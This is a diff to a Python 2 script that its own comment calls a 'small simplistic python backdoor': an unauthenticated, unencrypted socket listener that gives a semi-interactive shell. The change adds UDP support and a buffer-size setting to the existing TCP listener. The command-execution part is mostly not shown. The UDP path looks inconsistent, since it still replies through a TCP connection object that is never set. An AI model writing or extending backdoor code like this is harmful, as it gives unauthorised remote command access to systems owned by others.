@@ -23,31 +23,43 @@
 #  
 
 # Small simplistic python backdoor.
-# Features: ipv4/ipv6, no encryption, no auth, semi-interactive shell.
+# Features: ipv4/ipv6, udp/tcp, no encryption, no auth, semi-interactive shell.
 
 def main(args):
 	debug = False
 	interactive = False
 	ipversion = 6
 	port = 48329
-	host = '::1'
+	bufferSize = 4096
+	host = "::1"
+	protocol = "tcp"
+	afnet = socket.AF_INET6
+	socku = socket.SOCK_STREAM
 	if ipversion is 4:
-		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		host = 'localhost'
-	else:
-		sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+		host = "localhost"
+		afnet = socket.AF_INET
+	if "udp" in protocol:
+		socku = socket.SOCK_DGRAM
+	sock = socket.socket(afnet, socku)
 	server_address = (host, port)
 	sock.bind(server_address)
-	sock.listen(1)
+	if "udp" not in protocol:
+		sock.listen(1)
 	if debug is True:
 		print "Finding the light!"
 	while True: #Not using threads so not a good idea to allow it to support multiple connections.
-		connection, client_address = sock.accept()
+		if "udp" not in protocol:
+			connection, client_address = sock.accept()
 		try:
-			if debug is True:
-				print >>sys.stderr, 'NCF: ', client_address
+			if debug is True and "udp" not in protocol:
+				print >>sys.stderr, "NCF: ", client_address
 			while True:
-				d = connection.recv(1024)
+				if "udp" not in protocol:
+					d = connection.recv(bufferSize)
+				else:
+					d, client_address = sock.recvfrom(bufferSize)
+					if debug is True:
+						print >>sys.stderr, "NCF: ", client_address
 				if d:
 					if "exit" in d: # To allow exit command to exit the connection.
 						break
@@ -64,7 +76,7 @@ def main(args):
 							connection.sendall(l)
 				else:
 					if debug is True:
-						print >>sys.stderr, 'PD: ', client_address
+						print >>sys.stderr, "PD: ", client_address
 					break
             
 		finally:
